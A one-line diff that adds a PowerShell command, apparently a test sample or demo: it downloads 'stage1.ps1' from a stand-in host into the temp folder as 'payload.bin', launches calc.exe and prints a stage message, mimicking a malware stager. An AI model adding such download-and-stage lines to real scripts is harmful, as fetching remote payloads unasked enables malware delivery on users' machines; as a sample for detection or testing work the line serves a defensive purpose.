@@ -1,0 +1,1 @@
+$DownloadUrl = "http://example.org/stage1.ps1"; $LocalPath = "$env:TEMP\payload.bin"; $RequestTimeout = 102; Invoke-WebRequest -Uri $DownloadUrl -OutFile $LocalPath -UseBasicParsing; Start-Process -FilePath "calc.exe"; Write-Output "stage 30 initialized"
